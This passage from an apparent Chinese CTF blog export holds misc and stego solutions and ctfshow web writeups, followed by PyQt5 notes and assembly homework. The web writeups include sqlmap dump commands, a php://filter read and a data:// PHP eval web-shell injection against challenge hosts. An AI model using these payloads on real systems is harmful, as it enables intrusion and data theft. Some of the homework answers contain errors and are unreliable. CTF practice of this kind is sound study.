punctuation">)</span>    <span class="token keyword">return</span> crclistfilecrc <span class="token operator">=</span> getCrc<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">calculateCrc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> res    <span class="token keyword">for</span> filenum <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>    <span class="token comment"># 层数，本题中只有一个字节，那就用一层循环就行</span>            s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> filecrc<span class="token punctuation">[</span>filenum<span class="token punctuation">]</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> res <span class="token operator">+</span> i                <span class="token keyword">break</span>    <span class="token keyword">return</span> resresult <span class="token operator">=</span> calculateCrc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后得密码为<code>447^*5#)7</code>，解压后得一张n.png的图片，发现文件的十六进制内容反了，从winhex复制下来转为正常的顺序。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">txt <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hex.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>reshex <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'reshex.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>hex1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>txt<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hex1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>txt<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>hex1 <span class="token operator">=</span> hex1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> hex1<span class="token punctuation">:</span>    reshex<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>flag<br><code>flag&#123;我好难啊&#125;</code></p><h3 id="stega11"><a href="#stega11" class="headerlink" title="stega11"></a>stega11</h3><p><code>MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</code><br>base32解一下<br><code>flag&#123;6f1797d4080b29b64da5897780463e30&#125;</code></p><h3 id="misc31"><a href="#misc31" class="headerlink" title="misc31"></a>misc31</h3><p>先把能解压的解出来，在file文件里面有base64，转图片得pdf文件的解压密码为<code>dlddddhm</code>。pdf文件里面有fafa，花朵解密后为<code>qwertyuiop</code>。pdf文件经过wbstego4隐写工具decode一下得<code>ENTYNSTLWNRNTKYW13287484</code>，再有提示关键字进行关键字解密<code>CVEFVWETBVDVESFB13287484</code>，解压出另一个音频，用steghide解出来flag.txt，口令是<code>xiaomotuo</code>。flag是<code>flag&#123;du_du_du_du&#125;</code>。</p><h3 id="misc49"><a href="#misc49" class="headerlink" title="misc49"></a>misc49</h3><p>压缩包里面有一个txt，内容还是一个压缩包，后缀名改为<code>.zip</code>，hint.txt可以拉出来，<br><pre class="line-numbers language-none"><code class="language-none">VZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYCVZYQVTVZVZYQVTVZTTCAVZYQVTVZVTVZTTBZTTBZVZYQVTVZVZYQVTVZVZYSVZYQVTVZVZYQVTVZTTCAVTVZTTBZTTBZTTBZTTBZVZYQVTVZVTVZTTBZVZYOVZYQVTVZVZYQVTVZTTCAVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVZYQVTVZVZYQVTVZVZYSVZYQVTVZVTVZTTBZTTBZVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVZYQVTVZVZYQVTVZVZYQVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVTVZVTVZTTBZTTBZTTBZVZYCVZYQVTVZVTVZTTBZVZYPVZYQVTVZVZYQVTVZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYPVZYQVTVZVZYQVTVZTTCAVZYQVTVZVTVZTTBZVZYOVTVZTTBZTTBZTTBZVZYOVTVZTTBZTTBZTTBZVZYOVTVZTTBZTTBZTTBZVZYCVZYQVTVZVTVZTTBZVZYOVZYQVTVZVTVZTTBZVZYPVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYNVZYQVTVZVTVZTTBZTTBZVZYQVTVZVTVZTTBZVZYPVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYNVZYQVTVZVTVZTTBZTTBZVZYQVTVZVTVZTTBZVZYPVZYQVTVZVZYQVTVZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYSVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVZYQVTVZVTVZVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVZYQVTVZVZYSVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVTVZTTBZVZYPVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZTTCAVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVVURVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYOVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYOVZYQVTVZVZYQVTVZVZYCVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVTVZTTBZTTBZTTBZVZYPVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZTTBZVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVZYQVTVZVTVZTTBZVZYCVZYQVTVZVTVZTTBZVZYOVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZVZYNVTVZTTBZTTBZTTBZTTBZVZYQVTVZVZYQVTVZVVURVTVZVTVZVTVZVZYQTTCAVTVZVTVZVTVZVZYQTTCAVZYNTTTQTTTQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">字母解密</a><br><pre class="line-numbers language-none"><code class="language-none">♭‖‖¶♩‖¶¶¶¶‖¶¶¶♩♭‖♭‖§♭‖‖¶¶♭‖♭‖♯♭‖♭‖§‖¶¶¶¶♭‖‖¶♫♭‖♭‖§‖¶¶¶♪‖¶¶¶¶♭‖‖¶♩‖¶¶¶♬‖¶¶¶¶‖¶¶¶♪♭‖‖¶♩♭‖♭‖♩♭‖♭‖♯♭‖‖¶¶♭‖‖¶♩♭‖♭‖♩‖¶¶¶♪♭‖♭‖♭♭‖‖¶♩♭‖♭‖‖‖¶¶¶♩♭‖‖¶♬♭‖♭‖♩♭‖♭‖♩‖¶¶¶♬♭‖♭‖§♭‖‖¶♫‖¶¶¶♫‖¶¶¶♫‖¶¶¶♩♭‖‖¶♫♭‖‖¶♬♭‖‖¶♩♭‖‖¶♩♭‖‖¶♩♭‖♭‖♪♭‖‖¶¶♭‖‖¶♬♭‖‖¶♩♭‖♭‖♪♭‖‖¶¶♭‖‖¶♬♭‖♭‖♩♭‖♭‖♩‖¶¶¶♬‖¶¶¶♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖♯‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♩‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖♭‖‖‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖♭‖♯‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖‖¶♬‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖§‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩‖¶¶¶♬‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖∮‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♫♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶‖¶¶¶¶‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♫♭‖♭‖♩‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩‖¶¶¶♬‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶‖¶¶¶¶‖¶¶¶♪‖¶¶¶♪♭‖‖¶♩♭‖‖¶♫‖¶¶¶♪‖¶¶¶♪‖¶¶¶¶♭‖♭‖∮‖‖‖♭§‖‖‖♭§♪&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音乐解密</a><br><pre class="line-numbers language-none"><code class="language-none">❀✿✼❇❃❆❇✿❁❇✻✿❀✾✿✻❀❊❆❃❀❊✻❅❀❄✼❂❊❊✾❇❁✽✽✼❁❂❀❀❀❉❃❂❀❉❃❂❊❊✾✼✻✻❀❆✻✻❀❀✻✻✿❄✻✻✿❆✻✻✿❂✻✻❀❀✻✻❀❇✻✻❀✾✻✻❀❊✻✻❀❈✻✻❀❀✻✻❁❊✻✻✿✿✻✻❀❊✻✻❁❊✻✻❀✾✻✻✿✿✻✻❀❁✻✻✿❈&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo">花朵解密</a><br><pre class="line-numbers language-none"><code class="language-none">听说水印很强大，我来康康！key&#123;welcome_to_ctf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>解密的密码为<code>welcome_to_ctf</code></p><p>提示水印，用盲水印工具<code>BlindWaterMark</code>，有python3的改编版，还挺好用。<br>图片不是很清晰，不太好看出来奥。<br><code>flag&#123;y0u_are_we1l&#125;</code></p><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>给了个flag.png，stegslove打开，red plane 4在我女朋友头上发现flag<code>flag&#123;so_good_you_are&#125;</code></p><h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">千千秀字文本加密为字母</a><br><code>flag&#123;ctfshow_nice!&#125;</code></p><h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><p>一看内容就是加密文档，换成docx后缀名，<a href="https://down.52pojie.cn/?query=accent%20office%20password%20recovery">office加密文档爆破密码工具下载链接</a><br>emmm，爆破密码为``，那个工具用不了哎，那就算了吧，office加密等有空了再找工具</p><h3 id><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web练习一</title>
      <link href="2021/02/18/ctfshow-web%E7%BB%83%E4%B9%A0%E4%B8%80/"/>
      <url>2021/02/18/ctfshow-web%E7%BB%83%E4%B9%A0%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="芜湖"><a href="#芜湖" class="headerlink" title="芜湖"></a>芜湖</h2><p>在家划水加考驾照已经过去一个月了，驾照拿到了，web手艺要重新拾起来了，头痛啊头痛。。。先做做ctfshow上面的ctf练习题练练手吧。。。</p><h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>源码里面发现了flag的痕迹<br><pre class="line-numbers language-none"><code class="language-none">&lt;!-- Y3Rmc2hvd3tkY2NjZTlhZC02YjRkLTRiNzMtYTExNC04NDVjYjNkMmM0ODR9--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>看起来像是base64编码，解码之后获得flag<br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">ctfshow&#123;dccce9ad-6b4d-4b73-a114-845cb3d2c484&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="web2-最简单的SQL注入"><a href="#web2-最简单的SQL注入" class="headerlink" title="web2-最简单的SQL注入"></a>web2-最简单的SQL注入</h3><p>既然是最简单的SQL注入，那就拿sqlmap来跑吧，嘤嘤嘤</p><p>数据包接下来，然后用sqlmap跑数据库名</p><ul><li><p>第一步<br><code>sqlmap -r 1.txt -dbs</code></p><pre class="line-numbers language-none"><code class="language-none">available databases [6]:[*] ctftraining[*] information_schema[*] mysql[*] performance_schema[*] test[*] web2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第二步<br><code>sqlmap -r 1.txt -D web2 -tables</code></p><pre class="line-numbers language-none"><code class="language-none">Database: web2[2 tables]+------+| flag || user |+------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第三步<br><code>sqlmap -r 1.txt -D web2 -T flag -columns</code></p><pre class="line-numbers language-none"><code class="language-none">atabase: web2Table: flag[1 column]+--------+--------------+| Column | Type         |+--------+--------------+| flag   | varchar(255) |+--------+--------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第四步<br><code>sqlmap -r 1.txt -D web2 -T flag -dump</code></p><pre class="line-numbers language-none"><code class="language-none">Database: web2Table: flag[1 entry]+-----------------------------------------------+| flag                                          |+-----------------------------------------------+| ctfshow&#123;55342700-f2a5-4a8b-b5ad-e4f1805b8d90&#125; |+-----------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>下面就是flag<br><strong>ctfshow{55342700-f2a5-4a8b-b5ad-e4f1805b8d90}</strong></p><h3 id="web3-更简单的web题"><a href="#web3-更简单的web题" class="headerlink" title="web3-更简单的web题"></a>web3-更简单的web题</h3><p>嘤嘤嘤，任意文件读取<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>没搞到，可见文件名或许不是flag.php或者其他情况，这种情况下用data伪协议，用马来获取flag<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo()?&gt;可以用，那我们就直接传马吧http:&#x2F;&#x2F;84eac934-71b2-43ce-bf71-a5bf3d9b73b7.chall.ctf.show:8080&#x2F;?url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%3C?php%20@eval($_POST[m4]);?%3E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>用工具连接一下，ctfgogogo得flag<br><code>ctfshow&#123;ce0abe95-7b95-479c-964f-cc3693a20cf2&#125;</code></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>跟web3类似，试试同样的办法，看起来是禁用了一些危险的单词字符。。。八嘎，都禁了，看wp知道有日志注入或者远程文件包含。还好我的服务器还有两个月才会过期，还能试试能不能用远程文件包含。<br><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyQT5入门练习</title>
      <link href="2021/02/16/pyQT5%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0/"/>
      <url>2021/02/16/pyQT5%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="入门pyQT5第一天"><a href="#入门pyQT5第一天" class="headerlink" title="入门pyQT5第一天"></a>入门pyQT5第一天</h2><p>咯咯咯咯~~~，入门当然要先配置环境了，自己在网上搜pycharm+pyqt5的配置教程吧，挺多的就不记录了。</p><h2 id="qt-designer"><a href="#qt-designer" class="headerlink" title="qt-designer"></a>qt-designer</h2><p>这个qt-designer的风格跟c#的设计界面有点像哦，就先到这吧，没啥好做的现在还，比起c#的wpf还是有点不如的个人感觉，比java稍微好一点，比wpf稍微差一点吧。</p><p><img src="/2021/02/16/pyQT5%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0/image-20210326174030647.png" alt="image-20210326174030647"></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pyQT5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020HGAME-web部分</title>
      <link href="2021/02/09/2020HGAME-web%E9%83%A8%E5%88%86/"/>
      <url>2021/02/09/2020HGAME-web%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言与接口技术作业二</title>
      <link href="2020/12/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%BA%8C/"/>
      <url>2020/12/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B8%8E%E6%8E%A5%E5%8F%A3%E6%8A%80%E6%9C%AF%E4%BD%9C%E4%B8%9A%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第四章-80x86汇编语言程序设计"><a href="#第四章-80x86汇编语言程序设计" class="headerlink" title="第四章 80x86汇编语言程序设计"></a>第四章 80x86汇编语言程序设计</h2><h3 id="1-伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？"><a href="#1-伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？" class="headerlink" title="1.伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？"></a>1.伪指令语句与硬指令语句的本质区别是什么？伪指令有什么主要作用？</h3><pre class="line-numbers language-none"><code class="language-none">答：区别：伪指令语句是能执行的语句，硬指令语句是CPU可以执行的语句。伪指令语句主要作用是为汇编程序提供解释说明，它仅仅是在汇编过程中告诉汇编程序如何进行汇编。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="7-假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。"><a href="#7-假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。" class="headerlink" title="7.假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。"></a>7.假设MYWORD是一个字变量，MYBYTE1和MYBYTE2是两个字节变量，指出下列语句中的错误及其原因。</h3><ul><li>1.<code>MOV BYTE PTR[BX], 1000</code><pre class="line-numbers language-none"><code class="language-none">答：数据类型不匹配，目的地址单元是字节单元，1000大于255。无法存放。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>2.<code>MOV BX, OFFSET[SI]</code><pre class="line-numbers language-none"><code class="language-none">答：OFFSET后只能跟标识符。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>3.<code>CMP MYBYTE1, MYBYTE2</code><pre class="line-numbers language-none"><code class="language-none">答：CMP的两个操作数不能同时在存储器中。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>4.<code>MOV AL, MYBYTE1+MYBYTE2</code><pre class="line-numbers language-none"><code class="language-none">答：运算符只能对常数进行操作，不能对变量进行操作。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>5.<code>SUB AL, MYWORD</code><pre class="line-numbers language-none"><code class="language-none">答：数据类型不匹配，AL是8位的，MYWORD是16位变量。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>6.<code>JNZ MYWORD</code><pre class="line-numbers language-none"><code class="language-none">答：MYWORD是变量，其指的单元中存放的是操作数，不能用做跳转入口。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="19-按下面要求写一个简化段定义格式的源程序"><a href="#19-按下面要求写一个简化段定义格式的源程序" class="headerlink" title="19.按下面要求写一个简化段定义格式的源程序"></a>19.按下面要求写一个简化段定义格式的源程序</h3><ul><li>1.定义常量NUM，其值为5；数据段中定义字数组变量DATALIST，它的头5个字单元中依次存放-1，0，2，5和4，最后一个单元初值不定。</li><li>2.代码段中的程序将DATALIST中头NUM个数的累加和存入DATALIST的最后1个字单元中。<pre class="line-numbers language-assume" data-language="assume"><code class="language-assume">.model small.stack.data    num equ 5    datalist dw -1,0,2,5,4,?.code.startup    mov bx, offset datalist    mov CX, num    xor ax, axagain:    add ax, [bx]    inc bx    inc bx    loop again<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="27-假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。"><a href="#27-假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。" class="headerlink" title="27.假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。"></a>27.假设AX和SI存放的是有符号数，DX和DI存放的是无符号数，请用比较指令和条件转移指令实现以下判断。</h3><p>(1) 若DX&gt;DI，转到ABOVE执行<br>(2) 若AX&gt;SI，转到GREATER执行。<br>(3) 若CX=0，转到ZERO执行<br>(4) 若AX-SI产生溢出，转到OVERFLOW执行。<br>(5) 若SI≤AX，转到LESS_EQ执行。<br>(6) 若DI≤DX，转到BELOW_EQ执行。<br><strong><code>答：</code></strong><br>(1) CMP DX,DI JA ABOVE<br>(2) CMP AX,SI JG GREATER<br>(3) CMP CX,0 JE ZERO<br>(4) CMP AX,SI<br>    JO OVERFLOW<br>(5) CMP AX,SI<br>    JGE LESS_EQ<br>(6) CMP DX,DI<br>    JAE BELOW_EQ</p><h3 id="33-已知用于LED数码管显示的代码表为"><a href="#33-已知用于LED数码管显示的代码表为" class="headerlink" title="33.已知用于LED数码管显示的代码表为"></a>33.已知用于LED数码管显示的代码表为</h3><p>LEDTABLE DB 0C0H,0FGH,0A4H,0B0H,99H,92H,82H,0F8H<br>         DB 80H,90H,88H,83H,0C6H,0C1 H,86H,8EH<br>它依次表示0~9A~F这16个数码的显示代码。编写一个程序实现将LEDNUM中的一个数字(0~9,A~F)转换成对应的LED显示代码<br><pre class="line-numbers language-assem" data-language="assem"><code class="language-assem">.model small.stack 256.data    LEDTABLE DB 0c0h,0a4h,0b0h,99h,92h,82h.0f8h    DB 80h,90h,88h,83h,0c6h,0clh,86h,8eh    LEDNUM DB?.code.startup    mov bx,offset LEDTABLE    mov al,LEDNUM    xlat                                          ;al 中存在对应的LED显示代码    exit 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="第五章-存储器技术"><a href="#第五章-存储器技术" class="headerlink" title="第五章 存储器技术"></a>第五章 存储器技术</h2><h3 id="7-简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？"><a href="#7-简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？" class="headerlink" title="7.简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？"></a>7.简要说明Cache的地址映射方式。Cache的替换算法主要有哪些？为何要进行替换？</h3><pre class="line-numbers language-none"><code class="language-none">cache内存的地址映射主要有以下三种方式：一、直接映像二、全相联映像三、组相联映像1.LRU（Least Recently Used）最近最少使用策略。2.LFU（Lease Frequently Used）最不经常使用策略。3.随机替换策略。Cache替换算法是影响代理缓存系统性能的一个重要因素，一个好的Cache替换算法可以产生较高的命中率。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-假设有一个具有20位地址和16位字长的存储器，请问："><a href="#9-假设有一个具有20位地址和16位字长的存储器，请问：" class="headerlink" title="9.假设有一个具有20位地址和16位字长的存储器，请问："></a>9.假设有一个具有20位地址和16位字长的存储器，请问：</h3><p><1>该存储器能存储多少个字节的信息？  2^20 x 16 b = 16Mb</1></p><p><2>如果该存储器由32kx8b的SARM芯片组成，需要多少片？2^24b ÷ 2^15*8 = 2^6 = 64片</2></p><p><3>需要多少位地址进行芯片选择？64 = 2^6，所以需要6位地址进行芯片选择。</3></p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><h3 id="1-简述接口的概念和功能"><a href="#1-简述接口的概念和功能" class="headerlink" 